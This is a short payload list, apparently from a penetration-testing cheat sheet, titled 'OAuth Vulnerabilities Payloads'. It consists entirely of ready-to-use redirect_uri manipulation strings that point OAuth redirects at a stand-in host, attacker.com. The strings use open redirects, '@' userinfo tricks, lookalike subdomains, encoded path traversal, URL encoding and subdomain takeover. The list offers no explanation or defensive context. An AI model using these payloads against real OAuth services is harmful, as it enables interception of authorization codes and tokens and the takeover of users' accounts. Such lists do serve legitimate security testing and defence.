# OAuth Vulnerabilities Payloads

## ========================================
## REDIRECT_URI MANIPULATION
## ========================================

# Open redirect
?redirect_uri=http://attacker.com
?redirect_uri=http://target.com@attacker.com
?redirect_uri=http://target.com.attacker.com

# Path traversal
?redirect_uri=http://target.com/../attacker.com
?redirect_uri=http://target.com/..%2f..%2fattacker.com

# Subdomain takeover
?redirect_uri=http://old.target.com (if vulnerable)

# URL encoding
?redirect_uri=http%3A%2F%2Fattacker.com
